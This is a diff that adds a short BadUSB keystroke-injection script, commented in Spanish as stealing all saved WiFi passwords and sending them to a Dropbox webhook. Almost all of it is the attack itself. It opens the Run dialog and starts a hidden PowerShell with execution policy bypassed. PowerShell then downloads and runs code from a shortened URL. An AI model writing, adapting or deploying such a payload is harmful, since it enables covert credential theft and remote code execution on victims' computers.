@@ -1,0 +1,11 @@
+
+REM Author: Tu Nombre
+REM Date: 2024-07-15
+REM Description: Roba todas las contraseñas WiFi guardadas y las envía a un webhook de Dropbox.
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd /c "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$token=''; irm 'https://goo.su/3KEbG' | iex -Args $token""
+ENTER
+
